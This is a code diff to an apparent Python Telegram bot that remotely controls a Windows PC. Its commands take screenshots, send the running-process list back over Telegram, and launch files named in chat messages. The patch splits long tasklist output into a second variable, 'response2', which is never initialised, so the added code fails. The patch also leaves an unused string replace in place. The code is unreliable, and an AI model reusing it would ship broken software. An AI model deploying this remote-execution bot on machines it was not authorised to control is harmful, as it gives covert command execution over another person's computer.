@@ -91,7 +91,9 @@ def on_chat_message(msg):
 
 
 def on_callback_query(msg):
-    file_name, response, command = ''
+    file_name = ''
+    response = ''
+    command = ''
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
     print('Callback Query:', query_id, from_id, query_data)
     if query_data == 'capture_pc':
@@ -300,8 +302,12 @@ def on_callback_query(msg):
         lines = os.popen('tasklist /FI "STATUS eq RUNNING"')
         for line in lines:
             line.replace('\n\n', '\n')
-            response += line
+            if len(line)>2000:
+                response2 +=line
+            else:
+                response += line
         bot.sendMessage(from_id, response)
+        bot.sendMessage(from_id, response2)
     elif query_data == 'run':
         bot.sendChatAction(from_id, 'typing')
         path_file = command.replace('/run', '')
